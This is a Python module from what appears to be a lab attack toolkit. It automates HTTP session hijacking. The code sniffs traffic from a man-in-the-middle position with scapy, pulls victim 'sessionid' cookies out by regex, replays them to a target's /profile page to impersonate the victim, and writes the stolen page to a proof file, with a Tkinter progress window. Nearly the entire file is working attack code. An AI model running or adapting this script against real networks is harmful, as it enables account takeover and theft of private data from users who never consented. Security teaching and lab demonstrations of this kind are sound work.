"""
src/attacks/HTTP_session_hijacking.py:
Module for automated HTTP Session Hijacking attack:
 - Sniffs HTTP traffic while in MITM position
 - Extracts insecure session cookies from Victim
 - Replays the session to impersonate the Victim
 - Shows a GUI popup window with attack progress & state tracking
 - Produces HTML file for demonstration
"""

import threading
import time
import re
import requests
from scapy.all import sniff, TCP, Raw
from tkinter import Tk, ttk, StringVar, Label
from datetime import datetime

class HTTPSessionHijacker(threading.Thread):
    """
    This thread continuously sniffs for insecure HTTP cookies and automatically
    replays the Victim's session.
    """

    def __init__(self, target_domain: str, target_ip: str, victim_ip: str, interface: str = None):
        super().__init__()
        self.daemon = True

        # Stop flag for termination
        self._stop_event = threading.Event()

        # Target context
        self.target_domain = target_domain
        self.target_ip = target_ip
        self.victim_ip = victim_ip
        self.interface = interface

        # Storage
        self.stolen_cookie = None
        self.session_replay_success = False

        # Setup GUI
        self._setup_gui()

    # GUI pop-up window for attack progress track
    def _setup_gui(self):
        """Creates a Tkinter progress window for real-time attack updates."""
        self.gui = Tk()
        self.gui.title("HTTP Session Hijacking - Attack Progress")
        self.gui.geometry("480x260")
        self.gui.resizable(False, False)

        self.status_var = StringVar()
        self.status_var.set("Initializing attack...")

        Label(self.gui, text="Session Hijacking Attack", font=("Arial", 16, "bold")).pack(pady=10)
        Label(self.gui, textvariable=self.status_var, font=("Arial", 11)).pack(pady=10)

        self.progress = ttk.Progressbar(self.gui, length=380, mode="determinate", maximum=100)
        self.progress.pack(pady=15)

        Label(self.gui, text="Live Attack Log:", anchor="w").pack()
        self.log_box = ttk.Label(self.gui, text="", wraplength=450, justify="left")
        self.log_box.pack()

        # GUI runs in its own thread
        threading.Thread(target=self.gui.mainloop, daemon=True).start()

    def _update_gui(self, message: str, progress: int = None):
        """Updates GUI text and progress bar."""
        self.status_var.set(message)
        old = self.log_box.cget("text")
        self.log_box.config(text=old + f"\n• {message}")

        if progress is not None:
            self.progress["value"] = progress

    
    # Session cookies interception logic
    def _packet_callback(self, packet):
        """Intercepts HTTP packets and extracts session cookies."""
        if self._stop_event.is_set() or not packet.haslayer(TCP) or not packet.haslayer(Raw):
            return

        payload = packet[Raw].load.decode(errors="ignore")

        # Look for session cookies
        if "sessionid=" in payload:
            match = re.search(r"sessionid=([a-f0-9]+)", payload)
            if match:
                self.stolen_cookie = match.group(1)
                self._update_gui(f"Stolen session cookie: {self.stolen_cookie}", 40)
                print(f"[INFO] Stolen session cookie: {self.stolen_cookie}")

                # Once we have a cookie, launch replay
                self._replay_session()
                self._stop_event.set()

   
    # Session replay attack
    def _replay_session(self):
        """Uses stolen cookie to impersonate the victim."""
        self._update_gui("Replaying victim session...", 60)

        headers = {
            "Cookie": f"sessionid={self.stolen_cookie}",
            "User-Agent": "Mozilla/5.0 (AttackClient)"
        }

        try:
            url = f"http://{self.target_ip}/profile"
            response = requests.get(url, headers=headers)

            if "FBI Confidential" in response.text:
                self.session_replay_success = True
                self._update_gui("Session Hijack SUCCESS! Victim profile accessed.", 100)
                print("[SUCCESS] Session hijack successful.")
                self._generate_proof_file(response.text)
            else:
                self._update_gui("Session Hijack FAILED: Response invalid.", 100)
                print("[ERROR] Session replay failed.")

        except Exception as e:
            self._update_gui(f"Replay Error: {e}", 100)
            print(f"[ERROR] Replay failed: {e}")

    # Proof of exploit
    def _generate_proof_file(self, html_content):
        """Outputs stolen victim profile to HTML for demonstration."""
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"stolen_session_{timestamp}.html"

        with open(filename, "w") as f:
            f.write(html_content)

        self._update_gui(f"Proof file generated: {filename}")
        print(f"[INFO] Proof saved to {filename}")


    def run(self):
        self._update_gui("Sniffing HTTP packets for cookies...", 20)
        print("[INFO] Session Hijacking thread started.")

        sniff(
            iface=self.interface,
            prn=self._packet_callback,
            store=0,
            stop_filter=lambda _: self._stop_event.is_set()
        )

        print("[INFO] Session Hijacking stopped.")

    def stop(self):
        """Graceful shutdown."""
        self._stop_event.set()
        self._update_gui("Attack stopped", 100)


if __name__ == "__main__":
    """
    Standalone entry point to run HTTP Session Hijacking from the command line.
    Assumes:
      - Attacker is already in MITM position (ARP spoofing running)
      - Victim is browsing http://fbi.confidential (HTTP only)
      - The HTTP app is reachable on target_ip:/profile
    """
    import time

    TARGET_DOMAIN = "fbi.confidential"
    TARGET_IP     = "10.0.0.53"
    VICTIM_IP     = "10.0.0.10"   # victim VM IP
    INTERFACE     = "enp0s8"      # attacker interface on the mitmnet

    hijacker = HTTPSessionHijacker(
        target_domain=TARGET_DOMAIN,
        target_ip=TARGET_IP,
        victim_ip=VICTIM_IP,
        interface=INTERFACE,
    )

    hijacker.start()
    print("[INFO] HTTP Session Hijacking module running. Press Ctrl+C to stop.")

    try:
        while hijacker.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[INTERRUPT] Stopping hijacker...")
        hijacker.stop()
        hijacker.join()
        print("[INFO] Hijacker stopped.")
